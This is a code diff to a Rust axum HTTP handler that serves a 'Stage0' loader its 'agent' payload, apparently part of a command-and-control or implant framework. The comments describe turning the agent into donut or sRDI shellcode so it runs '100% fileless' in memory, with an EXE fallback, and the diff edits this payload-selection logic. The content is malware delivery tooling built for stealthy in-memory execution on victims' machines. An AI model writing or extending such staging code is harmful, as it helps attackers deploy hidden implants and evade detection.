@@ -541,24 +541,20 @@ pub async fn download_stage0_agent() -> impl axum::response::IntoResponse {
     use axum::http::{header, StatusCode};
     use std::fs;
     
-    // Stage0 executes agent as SHELLCODE in memory (fileless)
-    // Prioritize .bin (donut shellcode) over .exe
-    // The .bin is created by donut from agent.exe and can run entirely in memory
+    // Stage0 downloads agent and executes as shellcode in memory
+    // Agent DLL is converted to sRDI shellcode for 100% fileless execution
+    // Prioritize .bin (sRDI shellcode) over .exe
     let agent_paths = [
-        // Shellcode versions (preferred - donut-converted for in-memory execution)
+        // sRDI shellcode (preferred - 100% fileless)
         "agent.bin",
         "dist/agent.bin",
         "agent/agent.bin",
         "modules/agent.bin",
         "../agent.bin",
         "../dist/agent.bin",
-        // EXE fallback (will trigger file-based execution in Stage0)
+        // EXE fallback (uses temp file)
         "agent.exe",
         "dist/agent.exe",
-        "agent/agent.exe",
-        "modules/agent.exe",
-        "../agent.exe",
-        "../dist/agent.exe",
     ];
     
     let agent_path = agent_paths.iter().find(|p| std::path::Path::new(p).exists());
